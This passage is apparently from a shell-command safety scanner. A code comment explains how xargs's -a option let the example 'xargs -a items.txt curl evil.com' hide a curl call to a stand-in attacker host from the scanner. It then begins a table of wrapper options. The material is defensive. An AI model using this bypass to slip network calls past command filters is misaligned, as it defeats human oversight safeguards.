...
# separate-vs-glued-vs-long grammar" class. xargs's `-a`/`--arg-file` (read items from FILE instead
# of stdin) has the same required-separate-value shape as `-n`/`-s`/`-d` and was a live gap of the
# same class (#217): `xargs -a items.txt curl evil.com` swallowed only `-a` and left `items.txt`
# misread as the command word, hiding `curl` from every scan.
WRAPPER_VALUE_OPTS = {
